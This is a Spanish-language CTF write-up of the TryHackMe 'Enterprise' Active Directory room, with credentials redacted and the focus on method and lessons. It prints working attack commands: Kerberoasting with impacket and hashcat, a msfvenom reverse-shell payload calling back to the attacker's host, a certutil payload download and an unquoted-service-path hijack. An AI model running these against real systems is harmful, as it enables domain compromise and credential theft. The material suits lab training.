# Enterprise (TryHackMe) — foothold AD → SYSTEM por Unquoted Service Path

> **Writeup sanitizado.** Credenciales, hashes y flags van redactados (`<redacted>`). Metodología y lecciones, no un paso a paso que trivialice la sala.

**Tipo:** Active Directory · dominio **hijo** `LAB.ENTERPRISE.THM` bajo el padre `ENTERPRISE.THM` · DC `LAB-DC`
**Resumen:** `guest SMB → fuga de credenciales en repo Git → Kerberoast → RDP → Unquoted Service Path → SYSTEM`

---

## 1. Recon
DC con superficie **web extra**: IIS (80) y **Atlassian Bitbucket (7990)**. Dato de estructura: `DNS_Domain_Name = LAB.ENTERPRISE.THM` pero `DNS_Tree_Name = ENTERPRISE.THM` → **dominio hijo bajo un padre** (pista de escalada cross-domain para el final).

## 2. Enumeración con guest
```bash
nxc smb $ip -u 'guest' -p '' --shares        # null denegado; guest SÍ
```
Shares no estándar `READ`: `Docs` (con documentos Office protegidos con contraseña) y `Users`. RID-brute con guest → userlist del dominio (incluye cuentas `bitbucket`/`atlbitbucket` y la cuenta de trust del padre).

## 3. Foothold: credencial en el historial de Git
La web apunta (indirectamente) a un repositorio de código de la organización. El script actual tiene las credenciales vacías, **pero un commit anterior las conservaba**:
```bash
git clone <repo> ; cd <repo> ; git log -p    # las creds "borradas" siguen vivas en commits antiguos
```
→ credenciales de un usuario de dominio (`<user>:<redacted>`).

> **Lección:** un "nos movimos a GitHub" que **nombra un repo concreto NO es rabbit hole**. Y **borrar una credencial de un repo no la elimina**: sigue en `git log -p` salvo que reescriban la historia.
> *(Los documentos Office del share `Docs` eran una vía alternativa: `office2john` + hashcat `-m 9600` en GPU — pero el repo daba la cred antes.)*

## 4. Kerberoast → cuenta con RDP
Con la primera credencial:
```bash
impacket-GetUserSPNs LAB.ENTERPRISE.THM/<user>:<pass> -dc-ip $ip -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt        # -> cuenta de servicio 'bitbucket'
```
`bitbucket` (miembro de un grupo marcado como *sensitive-account*) → acceso por **RDP** al DC (xfreerdp). User flag.

## 5. Privesc: Unquoted Service Path → SYSTEM
`whoami /priv` sin privilegios útiles → vía = **unquoted service path**. **Las 3 comprobaciones:**
```cmd
:: 1. servicio vulnerable: Auto + espacios + sin comillas + fuera de C:\Windows
wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
:: 2. ¿carpeta escribible en el path?  (busca BUILTIN\Users:(W))
icacls "C:\Program Files (x86)\<Carpeta Con Espacios>"
:: 3. ¿como quién corre?  SERVICE_START_NAME = LocalSystem
sc qc <servicio>
```
**Por qué funciona:** con el path sin comillas, Windows prueba cada prefijo partido por el espacio + `.exe`. Si plantas un exe en el primer trozo **escribible**, se ejecuta como la cuenta del servicio (SYSTEM).
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<tun0> LPORT=443 -f exe -o <PrimeraPalabra>.exe
```
```cmd
certutil -urlcache -f http://<tun0>/<PrimeraPalabra>.exe "C:\...\<punto de truncamiento escribible>\<PrimeraPalabra>.exe"
sc stop <servicio> & sc start <servicio>     :: o reboot
```
→ shell **NT AUTHORITY\SYSTEM** = DA del dominio hijo. Root flag.

---

## Lecciones transversales
1. **Credencial borrada de un repo sigue en `git log -p`.** No descartes un repo nombrado como rabbit hole.
2. **No te bloquees en un crack lento** (Office en GPU): otras vías (repo, Kerberoast) pueden dar la cred antes.
3. **Kerberoast tras el primer foothold** = pan de cada día en AD.
4. **Unquoted Service Path, a mano:** `wmic/findstr` (path vulnerable) → `icacls` (carpeta escribible) → `sc qc` (corre como SYSTEM). Las 3 ✅ = SYSTEM. El exe se llama como la palabra antes del espacio en el punto de truncamiento escribible más a la izquierda.

## Cierre
`SYSTEM` en LAB-DC = **Domain Admin de LAB** (el DC es la propia máquina). Tras volcar/rociar credenciales en el dominio, una da **Pwned** → objetivo cumplido. El salto al dominio **padre** (`ENTERPRISE.THM`, Enterprise Admin) sería un extra de laboratorio, **no requerido** por la room.
